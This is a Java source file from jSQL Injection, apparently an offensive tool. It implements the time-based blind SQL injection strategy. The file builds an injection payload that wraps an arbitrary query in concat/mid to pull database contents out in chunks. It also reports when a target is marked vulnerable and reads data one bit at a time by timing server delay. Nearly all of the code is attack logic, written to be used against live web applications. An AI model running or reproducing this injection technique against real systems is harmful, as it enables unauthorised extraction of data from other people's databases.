/*******************************************************************************
 * Copyhacked (H) 2012-2014.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 *
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 *******************************************************************************/
package com.jsql.model.pattern.strategy;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.InjectionModel;
import com.jsql.model.Suspendable;
import com.jsql.model.bean.Request;
import com.jsql.model.blind.ConcreteTimeInjection;
import com.jsql.view.GUIMediator;

public class TimeStrategy implements IInjectionStrategy {
    
    private ConcreteTimeInjection time;
//    private TimeInjection time;
    
    private boolean isApplicable = false;
    
    @Override
    public void checkApplicability() throws PreparationException {
        InjectionModel.LOGGER.info("Time based test...");
        
        time = new ConcreteTimeInjection();
//        time = new TimeInjection();
        isApplicable = time.isInjectable();
//        isApplicable = time.isTimeInjectable();
        
        if (isApplicable) {
            activate();
        } else {
            deactivate();
        }
    }

    @Override
    public boolean isApplicable() {
        return isApplicable;
    }
    
    @Override
    public void activate() {
        Request request = new Request();
        request.setMessage("MarkTimebasedVulnerable");
        GUIMediator.model().interact(request);
    }

    @Override
    public void deactivate() {
        Request request = new Request();
        request.setMessage("MarkTimebasedInvulnerable");
        GUIMediator.model().interact(request);
    }

    @Override
    public String inject(String sqlQuery, String startPosition, Suspendable stoppable) throws StoppableException {
        return time.inject(
                "(" 
                    + "select+"
                        + "concat("
                            + "0x53514c69,"
                            + "mid("
                                + "(" + sqlQuery + "),"
                                + startPosition + ","
                                + "65536"
                            + ")"
                        + ")"
                + ")", stoppable);
    }

    @Override
    public void applyStrategy() {
        InjectionModel.LOGGER.info("Using timebased injection...");
        GUIMediator.model().applyStrategy(this);
        
        Request request = new Request();
        request.setMessage("MessageBinary");
        request.setParameters("Asking server \"Is this bit true?\", if delay does not exceed 5 seconds then response is true.\n");
        GUIMediator.model().interact(request);
        
        Request request2 = new Request();
        request2.setMessage("MarkTimeStrategy");
        GUIMediator.model().interact(request2);
    }
}
